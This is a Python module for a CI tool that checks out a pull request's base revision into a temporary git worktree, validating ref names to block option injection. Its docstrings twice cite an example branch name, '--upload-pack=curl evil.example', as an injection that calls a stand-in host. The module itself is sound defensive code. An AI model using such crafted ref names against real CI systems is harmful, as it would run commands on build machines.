"""Reading another revision of the repository without disturbing this one.

Comparing a pull request against its base means building the *baseline* as well as the
proposal, and the baseline lives at a different Git revision. The obvious approaches are
both wrong:

* ``git stash`` then ``git checkout`` mutates the working tree, so an interrupted run
  leaves the developer's checkout in a state they did not ask for and may not notice;
* ``git archive`` into a temporary directory loses the repository, and a CDK app that
  reads Git metadata during synthesis then behaves differently.

``git worktree`` gives a second checkout of the same repository at another revision,
in its own directory, and removing it leaves nothing behind.

**Ref names are attacker-influenced.** In CI the ref comes from the pull request. Git
treats an argument beginning with ``-`` as an option, so a branch called
``--upload-pack=curl evil.example`` would be an argument injection. Every ref here is
validated before it reaches Git, and resolved to a commit SHA so that what actually
gets checked out cannot start with a dash at all. ``subprocess`` is used without a
shell throughout, so shell metacharacters are inert, but that alone does nothing
about an option injection.
"""

from __future__ import annotations

import contextlib
import re
import shutil
import subprocess
import tempfile
from collections.abc import Iterator
from contextlib import contextmanager
from pathlib import Path
from typing import Final

__all__ = [
    "REF_PATTERN",
    "GitError",
    "is_git_repository",
    "resolve_ref",
    "validate_ref",
    "worktree",
]

REF_PATTERN: Final = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/@+~^{}-]{0,254}$")
"""What a revision is allowed to look like.

This accepts a *revision expression*, not merely a refname: ``HEAD~1`` and
``origin/main^2`` are ordinary things to ask for, and a tool that refuses them teaches
people to work around it, which is its own security problem.

The rule that actually matters is the first character. Git reads any argument beginning
with ``-`` as an option, so a branch named ``--upload-pack=curl evil.example`` would be
an argument injection. ``~``, ``^`` and ``{}`` carry no meaning to Git's option parser
and are safe here; space, ``:``, ``?``, ``*``, ``[`` and backslash are excluded because
Git's own refname validation rejects them anyway.
"""

TIMEOUT_SECONDS: Final = 120
"""Git operations here are local. Anything slower than this has hung."""


class GitError(Exception):
    """A Git operation failed, or was refused before it ran."""


def validate_ref(ref: str) -> str:
    """Check that a ref is safe to pass to Git.

    Raises:
        GitError: if the ref could be read as an option or contains characters Git
            does not accept in a refname.
    """
    if not REF_PATTERN.match(ref):
        raise GitError(
            f"refusing to use {ref!r} as a Git revision: it must start with a letter "
            "or digit and contain only letters, digits and ._/@+~^{}- characters"
        )
    if ".." in ref:
        # Not a security issue by itself, but a range is not a revision, and Git would
        # interpret it as one somewhere unhelpful.
        raise GitError(f"{ref!r} looks like a range, not a single revision")
    return ref


def _git(*arguments: str, cwd: Path) -> str:
    """Run a Git command, returning stdout.

    Raises:
        GitError: if Git is missing, times out, or exits non-zero.
    """
    executable = shutil.which("git")
    if executable is None:
        raise GitError("git was not found on PATH")
    try:
        # nosec B603 - no shell, a resolved absolute executable, and every ref is
        # checked against REF_PATTERN before it can reach this call.
        completed = subprocess.run(  # noqa: S603  # nosec B603
            [executable, *arguments],
            cwd=cwd,
            capture_output=True,
            text=True,
            check=False,
            timeout=TIMEOUT_SECONDS,
        )
    except subprocess.TimeoutExpired as exc:
        raise GitError(f"git {arguments[0]} timed out after {TIMEOUT_SECONDS}s") from exc
    if completed.returncode != 0:
        detail = (completed.stderr or completed.stdout).strip()
        raise GitError(f"git {' '.join(arguments)} failed: {detail}")
    return completed.stdout.strip()


def is_git_repository(path: Path) -> bool:
    """Whether ``path`` is inside a Git working tree."""
    try:
        return _git("rev-parse", "--is-inside-work-tree", cwd=path) == "true"
    except GitError:
        return False


def resolve_ref(ref: str, *, repository: Path) -> str:
    """Resolve a ref to a commit SHA.

    Recording the SHA rather than the ref matters for reproducibility: ``origin/main``
    means something different tomorrow, and a report that says which commit it compared
    against can be re-run.

    Raises:
        GitError: if the ref is unsafe or unknown.
    """
    validate_ref(ref)
    return _git("rev-parse", "--verify", "--quiet", f"{ref}^{{commit}}", cwd=repository)


@contextmanager
def worktree(ref: str, *, repository: Path) -> Iterator[Path]:
    """Check ``ref`` out into a temporary worktree, and remove it afterwards.

    The working tree, the index and the current branch are untouched throughout.

    Yields:
        The path of the temporary checkout.

    Raises:
        GitError: if the ref is unsafe or unknown, or the worktree cannot be created.
    """
    commit = resolve_ref(ref, repository=repository)
    parent = Path(tempfile.mkdtemp(prefix="cost-gate-worktree-"))
    location = parent / "checkout"
    try:
        # --detach avoids creating a branch, and refuses nothing that a normal
        # checkout would allow. The commit SHA is used rather than the ref so that a
        # ref moving mid-run cannot change what was analysed.
        _git("worktree", "add", "--detach", "--quiet", str(location), commit, cwd=repository)
        yield location
    finally:
        # Best effort, in both steps: a failure to tidy up must not mask the real error
        # from the body, and a stale registration is harmless next to a lost traceback.
        with contextlib.suppress(GitError):
            _git("worktree", "remove", "--force", str(location), cwd=repository)
        shutil.rmtree(parent, ignore_errors=True)
